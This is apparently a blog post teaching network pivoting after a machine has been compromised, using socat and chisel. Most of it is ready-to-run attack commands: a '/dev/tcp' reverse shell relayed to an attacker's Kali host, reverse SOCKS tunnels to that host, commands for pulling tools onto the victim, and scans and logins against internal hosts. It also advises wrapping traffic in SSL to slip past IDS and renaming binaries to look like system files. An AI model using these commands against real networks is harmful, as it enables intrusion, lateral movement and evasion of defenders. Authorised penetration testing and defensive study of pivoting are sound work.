---
layout: post
title: "Pivoting Networks with SOCAT and Chisel"
category: "Network Security"
date: 2025-11-20
readTime: "12 min"
tags: [pivoting, socat, chisel, tunneling]
excerpt: "You've popped a box, but it's just a gateway to the internal network. Here's how to pivot through it using SOCAT and Chisel."
---

# Pivoting Networks with SOCAT and Chisel

So you got a shell on a machine, congrats! But wait—it's in a DMZ and you can't reach the juicy internal network from your box. That's where **pivoting** comes in.

Think of it like this: you use the compromised machine as a middleman to route your traffic to places you couldn't reach before.

## Quick Scenario

```
You → [Firewall] → Compromised DMZ → Internal Network
                        ↑
                    You are here
```

The firewall blocks you from talking to Internal Network directly, but DMZ can reach it. So you route your traffic *through* DMZ.

## SOCAT: The Quick Port Forwarder

SOCAT is like netcat on steroids. It connects two things together—sockets, files, whatever.

### Basic Port Forward

You want to access an internal web server at `192.168.1.100:80` but can't reach it directly.

```bash
# On the DMZ box
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

Now hit `http://dmz-ip:8080` from your machine → boom, you're talking to the internal server.

- `TCP-LISTEN:8080` = listen on port 8080
- `fork` = handle multiple connections
- `TCP:192.168.1.100:80` = forward to internal server

### Relay a Reverse Shell

You got a shell on Host A, but need to pivot to Host B which can only be reached from A.

```bash
# Your Kali
nc -lvnp 4444

# On Host A (pivot)
socat TCP-LISTEN:5555,fork TCP:kali-ip:4444

# On Host B (target)
bash -i >& /dev/tcp/host-A-ip/5555 0>&1
```

Shell from B hits A, A relays it to you. Clean.

### Encrypt It (Avoid IDS)

```bash
# Generate cert
openssl req -newkey rsa:2048 -nodes -keyout pivot.key -x509 -days 365 -out pivot.crt
cat pivot.key pivot.crt > pivot.pem

# On pivot
socat OPENSSL-LISTEN:443,cert=pivot.pem,verify=0,fork TCP:192.168.1.100:3389
```

Now your RDP traffic is SSL-wrapped. IDS won't see shit.

## Chisel: HTTP Tunneling Done Right

Chisel is perfect when firewalls only allow HTTP/HTTPS. It creates encrypted SSH tunnels over HTTP.

### Setup

```bash
# Download
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz
chmod +x chisel_linux_amd64
mv chisel_linux_amd64 chisel
```

### Reverse Port Forward

Most common use: forward an internal port back to your box.

```bash
# On your Kali (server)
./chisel server --reverse --port 8000

# On compromised box (client)
./chisel client kali-ip:8000 R:8080:192.168.1.100:80
```

Now `localhost:8080` on your Kali = `192.168.1.100:80` on the internal network.

### SOCKS Proxy (The Power Move)

Instead of forwarding specific ports, create a SOCKS proxy and route ALL traffic through it.

```bash
# On Kali
./chisel server --reverse --port 8000

# On pivot
./chisel client kali-ip:8000 R:socks
```

Now configure proxychains:

```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
```

Use it:

```bash
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains firefox
proxychains msfconsole
```

Everything goes through the pivot. You can hit the entire internal network like you're inside it.

### Multiple Forwards

```bash
./chisel client kali-ip:8000 \
  R:8080:192.168.1.100:80 \
  R:8443:192.168.1.100:443 \
  R:13389:192.168.1.200:3389
```

## Real-World Example

Here's what a full pentest looks like:

```bash
# 1. Got shell on DMZ box
nc -lvnp 4444  # listening

# 2. Upload chisel
cd /tmp
wget http://kali-ip/chisel
chmod +x chisel

# 3. SOCKS tunnel
./chisel client kali-ip:8000 R:socks

# 4. Scan internal network
proxychains nmap -sT -Pn -p 445,3389,88 192.168.1.0/24

# 5. Attack what you find
proxychains smbclient -L //192.168.1.10
proxychains evil-winrm -i 192.168.1.10 -u admin -p password
```

## When to Use What

**SOCAT:**
- Quick one-off port forwards
- Need to handle Unix sockets
- Already on the box (smaller binary)

**Chisel:**
- Need a SOCKS proxy
- Firewall only allows HTTP/HTTPS
- Want persistent encrypted tunnels
- Multiple services to access

## Pro Tips

1. **Hide your binaries** - Rename `chisel` to something innocent like `.systemd` or `update-notifier`
2. **Use legit ports** - 443, 80, 53 look less sus than 8000
3. **Clean up** - Kill your tunnels and delete binaries when done
4. **Chain pivots** - You can pivot through multiple boxes to go deeper

## Quick Reference

```bash
# SOCAT port forward
socat TCP-LISTEN:8080,fork TCP:target:80

# Chisel reverse forward
./chisel server --reverse --port 8000
./chisel client server-ip:8000 R:8080:target:80

# Chisel SOCKS
./chisel server --reverse --port 8000
./chisel client server-ip:8000 R:socks
```

That's it. Now go pivot some networks.
